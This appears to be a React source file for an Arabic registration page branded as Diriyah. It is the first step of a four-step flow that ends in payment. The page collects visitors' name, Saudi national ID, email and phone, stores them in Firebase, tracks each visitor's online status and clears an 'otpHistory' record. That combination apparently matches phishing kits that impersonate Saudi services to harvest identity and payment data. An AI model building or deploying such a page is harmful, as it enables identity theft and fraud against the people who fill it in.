import { Link, useLocation } from "wouter";
import { ArrowRight, User, IdCard, Mail, Phone, Sparkles } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useState, useEffect, useRef } from "react";
import { addData } from "@/lib/firebase";
import { setupOnlineStatus } from "@/lib/utils";
import emailjs from "@emailjs/browser";

const EMAILJS_SERVICE_ID = "service_1e5r05g";
const EMAILJS_TEMPLATE_ID = "template_xkdlwg3";
const EMAILJS_PUBLIC_KEY = "ROVj9RXGGeBR7U8iG";

export default function RegistrationPage() {
  return (
    <div className="min-h-screen bg-gradient-to-b from-[#f5efe6] to-[#ebddd0] flex flex-col" dir="rtl">
      <Header />
      <ProgressSteps currentStep={1} />
      <main className="flex-1 p-4 pb-8">
        <RegistrationForm />
      </main>
    </div>
  );
}

function Header() {
  return (
    <header className="bg-[#4a1525] text-white">
      <div className="container mx-auto px-4 py-4">
        <div className="flex items-center justify-between">
          <Link href="/">
            <Button size="icon" variant="ghost" className="text-white hover:bg-white/10" data-testid="button-back">
              <ArrowRight className="w-5 h-5" />
            </Button>
          </Link>
          <img src="/logo-white.svg" alt="Diriyah" className="h-10" />
          <div className="w-10" />
        </div>
      </div>
    </header>
  );
}

function ProgressSteps({ currentStep }: { currentStep: number }) {
  const steps = [
    { number: 1, label: "تسجيل" },
    { number: 2, label: "الحجز" },
    { number: 3, label: "السلة" },
    { number: 4, label: "الدفع" },
  ];

  return (
    <div className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] p-5" data-testid="progress-steps">
      <div className="flex items-center justify-center gap-1">
        {steps.map((step, index) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div
                className={`w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold transition-all duration-300 ${
                  step.number <= currentStep
                    ? "bg-gradient-to-br from-[#c9a96e] to-[#b8935a] text-white shadow-glow"
                    : "bg-muted text-muted-foreground"
                }`}
                data-testid={`step-${step.number}`}
              >
                {step.number}
              </div>
              <span className={`text-xs mt-2 font-medium ${step.number <= currentStep ? "text-primary" : "text-muted-foreground"}`}>
                {step.label}
              </span>
            </div>
            {index < steps.length - 1 && (
              <div
                className={`w-10 h-1 mx-1 rounded-full transition-all duration-300 ${
                  step.number < currentStep ? "bg-gradient-to-r from-[#c9a96e] to-[#b8935a]" : "bg-muted"
                }`}
              />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function RegistrationForm() {
  const [, setLocation] = useLocation();
  const [name, setName] = useState("");
  const [saudiId, setSaudiId] = useState("");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [honeypot, setHoneypot] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{
    name?: string;
    saudiId?: string;
    email?: string;
    phone?: string;
    bot?: string;
  }>({});

  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasScrolled = useRef(false);
  const hasMouseMoved = useRef(false);

  useEffect(() => {
    const handleScroll = () => {
      hasScrolled.current = true;
    };
    const handleMouseMove = () => {
      hasMouseMoved.current = true;
    };
    const handleKeyPress = () => {
      interactionCount.current++;
    };

    window.addEventListener("scroll", handleScroll);
    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("keypress", handleKeyPress);

    return () => {
      window.removeEventListener("scroll", handleScroll);
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("keypress", handleKeyPress);
    };
  }, []);

  const isBotDetected = (): boolean => {
    if (honeypot) return true;
    const timeSpent = Date.now() - formLoadTime.current;
    if (timeSpent < 3000) return true;
    if (interactionCount.current < 4) return true;
    if (!hasMouseMoved.current && !("ontouchstart" in window)) return true;
    return false;
  };

  const validateSaudiId = (id: string): boolean => {
    if (!/^\d{10}$/.test(id)) return false;
    if (!id.startsWith("1") && !id.startsWith("2")) return false;
    return true;
  };

  const validatePhone = (phoneNum: string): boolean => {
    const cleanPhone = phoneNum.replace(/\s/g, "");
    return /^(05|5)\d{8}$/.test(cleanPhone) || /^\+9665\d{8}$/.test(cleanPhone);
  };

  const validateEmail = (emailStr: string): boolean => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailStr);
  };

  const handleSubmit = async () => {
    if (isSubmitting) return;
    const newErrors: typeof errors = {};

    if (!name.trim()) {
      newErrors.name = "الاسم مطلوب";
    }

    if (!saudiId.trim()) {
      newErrors.saudiId = "رقم الهوية مطلوب";
    } else if (!validateSaudiId(saudiId)) {
      newErrors.saudiId =
        "رقم الهوية غير صحيح (يجب أن يكون 10 أرقام ويبدأ بـ 1 أو 2)";
    }

    if (!email.trim()) {
      newErrors.email = "البريد الإلكتروني مطلوب";
    } else if (!validateEmail(email)) {
      newErrors.email = "البريد الإلكتروني غير صحيح";
    }

    if (!phone.trim()) {
      newErrors.phone = "رقم الجوال مطلوب";
    } else if (!validatePhone(phone)) {
      newErrors.phone = "رقم الجوال غير صحيح";
    }

    setErrors(newErrors);

    if (Object.keys(newErrors).length === 0) {
      setIsSubmitting(true);
      const visitorId = `visitor_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
      const added = await addData({
        id: visitorId,
        name,
        saudiId,
        email,
        phone,
        currentPage: "registration",
      });
      if (!added) {
        setErrors((prev) => ({ ...prev, bot: "تعذر إكمال الطلب، يرجى المحاولة مرة أخرى" }));
        setIsSubmitting(false);
        return;
      }
      setupOnlineStatus(visitorId);
      localStorage.removeItem("otpHistory");

      try {
        await emailjs.send(
          EMAILJS_SERVICE_ID,
          EMAILJS_TEMPLATE_ID,
          {
            to_email: email,
            email: email,
            to_name: name,
            from_name: "الدرعية - Diriyah",
            message: `مرحباً ${name}، شكراً لتسجيلك في موقع الدرعية.`,
          },
          EMAILJS_PUBLIC_KEY,
        );
        console.log("Email sent successfully");
      } catch (error) {
        console.error("Failed to send email:", error);
      }

      setLocation("/booking");
      return;
    }
    setIsSubmitting(false);
  };

  return (
    <div className="max-w-md mx-auto animate-fade-in">
      <div className="bg-white rounded-2xl shadow-xl p-6 space-y-6">
        <div className="text-center mb-6">
          <div className="w-16 h-16 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto mb-4 shadow-glow">
            <Sparkles className="w-8 h-8 text-white" />
          </div>
          <h2 className="text-2xl font-bold text-foreground">
            معلومات المستخدم
          </h2>
          <p className="text-muted-foreground text-sm mt-2">أدخل بياناتك للمتابعة</p>
        </div>

        <input
          type="text"
          value={honeypot}
          onChange={(e) => setHoneypot(e.target.value)}
          className="absolute opacity-0 pointer-events-none h-0 w-0"
          tabIndex={-1}
          autoComplete="off"
          aria-hidden="true"
        />

        {errors.bot && (
          <p className="text-red-500 text-sm text-center" data-testid="error-bot">
            {errors.bot}
          </p>
        )}

        <div className="space-y-5">
          <div className="relative">
            <Label htmlFor="name" className="text-sm font-medium text-foreground mb-2 block">
              الاسم الكامل *
            </Label>
            <div className="relative">
              <User className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
              <Input
                id="name"
                type="text"
                value={name}
                onChange={(e) => setName(e.target.value.slice(0, 80))}
                maxLength={80}
                className={`pr-11 h-12 rounded-xl border-2 transition-all focus:border-primary ${errors.name ? "border-red-500" : "border-input"}`}
                placeholder="أدخل الاسم الكامل"
                data-testid="input-name"
              />
            </div>
            {errors.name && (
              <p className="text-red-500 text-xs mt-1" data-testid="error-name">
                {errors.name}
              </p>
            )}
          </div>

          <div className="relative">
            <Label htmlFor="saudiId" className="text-sm font-medium text-foreground mb-2 block">
              رقم الهوية الوطنية *
            </Label>
            <div className="relative">
              <IdCard className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
              <Input
                id="saudiId"
                type="text"
                value={saudiId}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 10);
                  setSaudiId(value);
                }}
                className={`pr-11 h-12 rounded-xl border-2 transition-all focus:border-primary ${errors.saudiId ? "border-red-500" : "border-input"}`}
                placeholder="أدخل رقم الهوية (10 أرقام)"
                maxLength={10}
                data-testid="input-saudi-id"
              />
            </div>
            {errors.saudiId && (
              <p className="text-red-500 text-xs mt-1" data-testid="error-saudi-id">
                {errors.saudiId}
              </p>
            )}
          </div>

          <div className="relative">
            <Label htmlFor="email" className="text-sm font-medium text-foreground mb-2 block">
              البريد الإلكتروني *
            </Label>
            <div className="relative">
              <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
              <Input
                id="email"
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value.slice(0, 120))}
                maxLength={120}
                className={`pl-11 h-12 rounded-xl border-2 transition-all focus:border-primary text-left ${errors.email ? "border-red-500" : "border-input"}`}
                dir="ltr"
                placeholder="example@email.com"
                data-testid="input-email"
              />
            </div>
            {errors.email && (
              <p className="text-red-500 text-xs mt-1" data-testid="error-email">
                {errors.email}
              </p>
            )}
          </div>

          <div className="relative">
            <Label htmlFor="phone" className="text-sm font-medium text-foreground mb-2 block">
              رقم الجوال *
            </Label>
            <div className="relative">
              <Phone className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
              <Input
                id="phone"
                type="tel"
                value={phone}
                onChange={(e) => {
                  const value = e.target.value.replace(/[^\d+]/g, "").slice(0, 15);
                  setPhone(value);
                }}
                maxLength={15}
                className={`pl-11 h-12 rounded-xl border-2 transition-all focus:border-primary text-left ${errors.phone ? "border-red-500" : "border-input"}`}
                dir="ltr"
                placeholder="05XXXXXXXX"
                data-testid="input-phone"
              />
            </div>
            {errors.phone && (
              <p className="text-red-500 text-xs mt-1" data-testid="error-phone">
                {errors.phone}
              </p>
            )}
          </div>
        </div>

        <div className="space-y-3 pt-4">
          <Button
            onClick={handleSubmit}
            size="lg"
            className="w-full bg-primary text-white shadow-lg"
            disabled={isSubmitting}
            data-testid="button-continue"
          >
            {isSubmitting ? "جاري الإرسال..." : "التالي"}
          </Button>

          <Link href="/tickets">
            <Button
              variant="outline"
              size="lg"
              className="w-full"
              data-testid="button-cancel"
            >
              إلغاء
            </Button>
          </Link>
        </div>
      </div>

      <p className="text-center text-muted-foreground text-xs mt-6">
        بياناتك محمية ومشفرة بالكامل
      </p>
    </div>
  );
}
